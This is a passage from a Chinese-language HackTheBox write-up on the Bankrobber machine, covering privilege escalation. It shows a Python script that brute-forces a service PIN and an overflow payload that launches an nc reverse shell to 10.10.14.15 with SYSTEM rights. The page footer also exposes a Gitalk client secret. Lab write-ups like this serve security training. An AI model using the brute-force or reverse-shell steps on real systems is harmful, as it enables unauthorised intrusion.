+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122917.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="netstat-ano-findstr-LISTENING"><a href="#netstat-ano-findstr-LISTENING" class="headerlink" title="netstat -ano | findstr LISTENING"></a>netstat -ano | findstr LISTENING</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr LISTENING</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3364</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732</span><br><span class="line">  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3364</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1572</span><br><span class="line">  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3388</span><br><span class="line">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       444</span><br><span class="line">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       892</span><br><span class="line">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       876</span><br><span class="line">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1340</span><br><span class="line">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       576</span><br><span class="line">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       584</span><br><span class="line">  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       3364</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       732</span><br><span class="line">  TCP    [::]:443               [::]:0                 LISTENING       3364</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3306              [::]:0                 LISTENING       3388</span><br><span class="line">  TCP    [::]:49664             [::]:0                 LISTENING       444</span><br><span class="line">  TCP    [::]:49665             [::]:0                 LISTENING       892</span><br><span class="line">  TCP    [::]:49666             [::]:0                 LISTENING       876</span><br><span class="line">  TCP    [::]:49667             [::]:0                 LISTENING       1340</span><br><span class="line">  TCP    [::]:49668             [::]:0                 LISTENING       576</span><br><span class="line">  TCP    [::]:49669             [::]:0                 LISTENING       584</span><br></pre></td></tr></table></figure>
+
+<h2 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session#    Mem Usage</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0                            0          4 K</span><br><span class="line">System                           4                            0        140 K</span><br><span class="line">smss.exe                       288                            0      1.188 K</span><br><span class="line">csrss.exe                      360                            0      8.324 K</span><br><span class="line">wininit.exe                    444                            0      5.296 K</span><br><span class="line">csrss.exe                      452                            1      4.140 K</span><br><span class="line">winlogon.exe                   520                            1     13.744 K</span><br><span class="line">services.exe                   576                            0      7.696 K</span><br><span class="line">lsass.exe                      584                            0     13.052 K</span><br><span class="line">svchost.exe                    668                            0     14.652 K</span><br><span class="line">svchost.exe                    732                            0      9.084 K</span><br><span class="line">dwm.exe                        824                            1     30.176 K</span><br><span class="line">svchost.exe                    876                            0     50.968 K</span><br><span class="line">svchost.exe                    892                            0     16.632 K</span><br><span class="line">svchost.exe                    904                            0     24.436 K</span><br><span class="line">svchost.exe                    936                            0     16.752 K</span><br><span class="line">svchost.exe                    392                            0     16.804 K</span><br><span class="line">svchost.exe                   1052                            0     16.520 K</span><br><span class="line">svchost.exe                   1100                            0      7.928 K</span><br><span class="line">svchost.exe                   1196                            0      7.124 K</span><br><span class="line">spoolsv.exe                   1340                            0     15.596 K</span><br><span class="line">bankv2.exe                    1572                            0         80 K</span><br><span class="line">svchost.exe                   1624                            0     20.816 K</span><br><span class="line">svchost.exe                   1652                            0     10.156 K</span><br><span class="line">vmtoolsd.exe                  1780                            0     23.688 K</span><br><span class="line">VGAuthService.exe             1788                            0     13.024 K</span><br><span class="line">Memory Compression            1904                            0     34.376 K</span><br><span class="line">xampp-control.exe             2224                            0      2.912 K</span><br><span class="line">WmiPrvSE.exe                  2364                            0     19.144 K</span><br><span class="line">dllhost.exe                   2436                            0     13.020 K</span><br><span class="line">msdtc.exe                     2612                            0     10.180 K</span><br><span class="line">LogonUI.exe                   2780                            1     49.004 K</span><br><span class="line">SearchIndexer.exe             2864                            0     18.632 K</span><br><span class="line">conhost.exe                   2276                            0        560 K</span><br><span class="line">httpd.exe                     3364                            0         36 K</span><br><span class="line">conhost.exe                   3372                            0         48 K</span><br><span class="line">mysqld.exe                    3388                            0     14.748 K</span><br><span class="line">conhost.exe                   3400                            0        112 K</span><br><span class="line">httpd.exe                     3724                            0      6.868 K</span><br><span class="line">svchost.exe                   3544                            0      7.076 K</span><br><span class="line">sedsvc.exe                    2788                            0      8.488 K</span><br><span class="line">svchost.exe                   3688                            0      8.296 K</span><br><span class="line">cmd.exe                       1692                            0      2.772 K</span><br><span class="line">conhost.exe                   1504                            0      4.188 K</span><br><span class="line">powershell.exe                3012                            0      6.784 K</span><br><span class="line">n.exe                         2420                            0      3.936 K</span><br><span class="line">cmd.exe                       4236                            0      3.116 K</span><br><span class="line">SearchProtocolHost.exe        1524                            0     10.764 K</span><br><span class="line">SearchFilterHost.exe          1292                            0      6.336 K</span><br><span class="line">tasklist.exe                  4424                            0      7.784 K</span><br></pre></td></tr></table></figure>
+
+<h1 id="bankv2"><a href="#bankv2" class="headerlink" title="bankv2"></a>bankv2</h1><p>首先脚本爆破出来pin码是0021:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122918.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用正确的pin码测试功能：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122919.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>如果输入长字符串，会发现覆盖了内部调用的程序，基础的溢出：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122920.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>那就是常规的确认偏移，构造payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msf-pattern_create -l 40</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A</span><br><span class="line">➜  ~ msf-pattern_offset -q 0Ab1</span><br><span class="line">[*] Exact match at offset 32</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122921.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>就直接修改为使用我们前面传的nc反弹shell,system权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.15 4446"'</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.15 4446</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122922.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="brute-py"><a href="#brute-py" class="headerlink" title="brute.py"></a>brute.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    sys.stdout.write(<span class="string">f"\rTrying: <span class="subst">&#123;i:<span class="number">04</span>d&#125;</span>"</span>)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'localhost'</span>, <span class="number">910</span>))</span><br><span class="line">    s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.send(<span class="string">f"<span class="subst">&#123;i:<span class="number">04</span>d&#125;</span>\n"</span>.encode())</span><br><span class="line">    resp = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">b"Access denied"</span> <span class="keyword">in</span> resp:</span><br><span class="line">        print(<span class="string">f"\rFound pin: <span class="subst">&#123;i:<span class="number">04</span>d&#125;</span>"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>之后就直接在admin桌面得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122923.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>HTB: Bankrobber | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/209" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/209</a></li>
+<li>HackTheBox - BankRobber - YouTube<br><a href="https://www.youtube.com/watch?v=zYmA9ECuCio&amp;feature=youtu.be&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=zYmA9ECuCio&amp;feature=youtu.be&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-12-29T07:05:29.012Z" itemprop="dateUpdated">2020-12-29 15:05:29</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&title=《Bankrobber - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&title=《Bankrobber - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bankrobber - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2099/12/31/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%94%A8%E8%AA%9E/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">セキュリティ用語</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/12/16/Ready-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Ready - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&title=《Bankrobber - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&title=《Bankrobber - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bankrobber - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3aMY7DMAwF0dz/0k4bILA9n5QLU6MqCByLbwsuSenzwev4Wf/fk+f557N3LlgyZMh4LeO4XP0NzoK+3p3HJkOGjH0Y6fbXT/Lf8jR9E7MMGTJkgKIwDT0tHGXIkCGjv01aUJLnZciQISNtYnnbSZIsH8wt7sVlyJDxQkZnZPb050fON2TIkPEqxhGutaUhGdihqGTIkDGakY7G0raTt681tgwZMmSkw7gajyRodB1NhgwZoxkksfKBfq1wTEvSG4wMGTLGMdJLpU8P9JedxMqQIWMcIw2LH2eS96Ql6WkTK0OGjNGMNOHyMRkPqMOWIUPGDoxOoiR/iPSAIR4FypAhYyjj+mdp80ma23QXNPKTIUPGaEY65KrVY+nBQ5rEZciQsQOjdtDIm1ISVu2yxem4TYYMGaMZvJjj47baFY00KhkyZExl9A8pr5G8xOQjNlTVypAhYxCjFmiQy0sDuHRHGTJk7MDgKZi3shxQe0Nwf0SGDBkjGGmgvE3lxw8LErcMGTI2YNTa2n5RyAdzNwWiDBkyNmB06kqeoDvJPfi/IUOGjEGMI1xrp/QkTaNSUoYMGaMZnQa1VjLWxm1kDCdDhozZDJJk0wNF0gynCfdmdxkyZGzA4ImPfENCr5V6N0eYMmTIkFEamXFMWozKkCFDBm8g+aiuNkpDqVyGDBkbMNLta2UfB8RJXIYMGaMZvHUkDWenWKwdD8iQIWM04wtkkbwqL+scuwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
